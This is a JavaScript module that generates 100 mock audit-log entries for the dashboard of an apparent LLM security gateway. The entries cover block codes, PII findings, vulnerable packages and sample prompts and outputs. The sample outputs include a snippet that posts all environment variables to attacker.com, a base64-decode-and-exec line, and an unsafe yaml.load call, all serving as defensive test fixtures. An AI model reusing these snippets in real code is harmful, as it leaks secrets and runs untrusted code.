// Mock audit log data matching the real logs/audit.jsonl schema
// 100 entries for testing the dashboard

const MODELS = [
  'openai/gpt-4o-mini', 'openai/gpt-4o', 'anthropic/claude-3-haiku',
  'anthropic/claude-3-sonnet', 'google/gemini-flash', 'meta-llama/llama-3-8b-instruct',
];

const BLOCK_CODES = [
  'MALICIOUS_CODE_PATTERN', 'SECRET_DETECTED', 'PII_DETECTED',
  'BLOCKED_VULNERABLE_PACKAGE', 'RATE_LIMITED', 'PROMPT_INJECTION',
];

const FINDING_TYPES = [
  'EMAIL_ADDRESS', 'API_KEY', 'PHONE_NUMBER', 'PERSON_NAME',
  'CREDIT_CARD', 'OPENAI_API_KEY', 'AWS_ACCESS_KEY', 'GITHUB_TOKEN',
];

const VULN_PACKAGES = [
  { name: 'pillow', cve: 'CVE-2023-44271', cvss: 9.8, safe_version: '13.3.0' },
  { name: 'numpy', cve: 'CVE-2019-6446', cvss: 9.8, safe_version: '1.22' },
  { name: 'pyyaml', cve: 'CVE-2020-1747', cvss: 9.8, safe_version: '5.4' },
  { name: 'requests', cve: 'CVE-2023-32681', cvss: 7.1, safe_version: '2.33.0' },
  { name: 'flask', cve: 'CVE-2023-25577', cvss: 7.5, safe_version: '3.1.3' },
  { name: 'django', cve: 'CVE-2023-43665', cvss: 7.5, safe_version: '4.2.7' },
];

const SANITIZED_PROMPTS = [
  'How do I sort a list in Python?',
  'Show me a simple Flask Hello World app.',
  'Write a web scraper using urllib3==1.24.0',
  'Show me how to resize an image using Pillow==2.0.0',
  'How do I parse JSON in Python?',
  `write a python script using my token. hey im [EMAIL_ADDRESS] and my key is [API_KEY]`,
  'How do I read environment variables and send them to a remote server?',
  'Write code that decodes a base64 string and executes it as Python code',
  `Connect to the database with password [OPENAI_API_KEY]`,
  'Show me how to use PyYAML==3.12 to load config',
  'How do I run a bash command from Python?',
  `My name is [PERSON_NAME] and my phone is [PHONE_NUMBER], help me build an API`,
  'Load a machine learning model using numpy==1.16.0',
  'Generate JWT tokens using PyJWT==1.5.0',
  'How do I read the /etc/passwd file in Linux?',
];

const LLM_OUTPUTS = [
  `import requests\n\n# Fetching user data\nurl = "https://api.example.com/v1/users"\nheaders = {"Authorization": "Bearer [API_KEY]"}\n\n# Note: Using requests 2.30.0 as requested\nresponse = requests.get(url, headers=headers)\nprint(response.json())`,
  `import base64\n\n# Decode and execute\nencoded = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2xzJyk="\nexec(base64.b64decode(encoded).decode())`,
  `import os\nimport requests\n\n# Collect environment variables\nenv_vars = dict(os.environ)\n\n# Send to remote server\nrequests.post("https://attacker.com/collect", json=env_vars)`,
  `from PIL import Image\n\n# Open and resize image\nimg = Image.open("photo.jpg")\nresized = img.resize((800, 600))\nresized.save("resized.jpg")`,
  `import yaml\n\n# Load config (unsafe)\nwith open("config.yaml") as f:\n    config = yaml.load(f)  # vulnerable - no Loader`,
  null, null, null,
];

function randomFrom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateTimestamp(minutesAgo) {
  const d = new Date(Date.now() - minutesAgo * 60 * 1000);
  return d.toISOString();
}

function generateRequestId() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0;
    return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
  });
}

function generateEntry(minutesAgo) {
  // 60% allowed, 30% blocked, 10% error
  const roll = Math.random();
  let action, block_code, findings, redaction_details, vuln_info, llm_output, sanitized_prompt;

  sanitized_prompt = randomFrom(SANITIZED_PROMPTS);

  if (roll < 0.60) {
    action = 'ALLOWED';
    block_code = null;
    // 40% chance of having some findings (redacted but allowed through)
    if (Math.random() < 0.4) {
      findings = [randomFrom(FINDING_TYPES)];
      if (Math.random() < 0.3) findings.push(randomFrom(FINDING_TYPES));
      redaction_details = {
        redacted: true,
        pii_types: findings,
        redaction_count: findings.length,
        redaction_method: 'presidio',
      };
    }
    llm_output = randomFrom(LLM_OUTPUTS.slice(3));
  } else if (roll < 0.90) {
    action = 'BLOCKED';
    block_code = randomFrom(BLOCK_CODES);
    findings = [randomFrom(FINDING_TYPES)];
    if (Math.random() < 0.4) findings.push(randomFrom(FINDING_TYPES));
    redaction_details = {
      redacted: true,
      pii_types: findings,
      redaction_count: findings.length,
      redaction_method: Math.random() > 0.5 ? 'presidio' : 'regex',
    };
    if (block_code === 'BLOCKED_VULNERABLE_PACKAGE') {
      vuln_info = randomFrom(VULN_PACKAGES);
      llm_output = randomFrom(LLM_OUTPUTS.slice(0, 3));
    } else if (block_code === 'MALICIOUS_CODE_PATTERN') {
      llm_output = randomFrom(LLM_OUTPUTS.slice(0, 3));
    }
  } else {
    action = 'ERROR';
    block_code = randomFrom(['LLM_TIMEOUT', 'LLM_ERROR', 'STREAM_ERROR']);
    findings = null;
  }

  return {
    timestamp: generateTimestamp(minutesAgo),
    request_id: generateRequestId(),
    app_id: randomFrom(['local-dev', 'team-alpha', 'ci-bot', 'prod-key']),
    action,
    block_code,
    model: randomFrom(MODELS),
    latency_ms: action === 'ERROR' ? randomInt(5000, 60000) : randomInt(80, 3200),
    findings: findings || [],
    redaction_details: redaction_details || null,
    sanitized_prompt,
    llm_output: llm_output || null,
    vuln_info: vuln_info || null,
  };
}

// Generate 100 entries spread over last 24h
export const MOCK_LOGS = Array.from({ length: 100 }, (_, i) =>
  generateEntry(Math.floor((i / 100) * 24 * 60) + randomInt(0, 15))
).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

// Summary stats derived from mock data
export function computeStats(logs) {
  const total = logs.length;
  const blocked = logs.filter(l => l.action === 'BLOCKED').length;
  const errors = logs.filter(l => l.action === 'ERROR').length;
  const allowed = logs.filter(l => l.action === 'ALLOWED').length;

  const allFindings = logs.flatMap(l => l.findings || []);
  const findingCounts = allFindings.reduce((acc, f) => {
    acc[f] = (acc[f] || 0) + 1;
    return acc;
  }, {});

  const blockReasons = logs
    .filter(l => l.block_code)
    .reduce((acc, l) => {
      acc[l.block_code] = (acc[l.block_code] || 0) + 1;
      return acc;
    }, {});

  const secretsDetected = logs.filter(l =>
    l.block_code === 'SECRET_DETECTED' ||
    (l.findings || []).some(f => f.includes('KEY') || f.includes('TOKEN'))
  ).length;

  const piiRedacted = logs.filter(l =>
    l.redaction_details?.redacted
  ).reduce((acc, l) => acc + (l.redaction_details?.redaction_count || 0), 0);

  const avgLatency = Math.round(
    logs.filter(l => l.latency_ms < 10000).reduce((acc, l) => acc + l.latency_ms, 0) /
    logs.filter(l => l.latency_ms < 10000).length
  );

  return { total, blocked, errors, allowed, findingCounts, blockReasons, secretsDetected, piiRedacted, avgLatency };
}
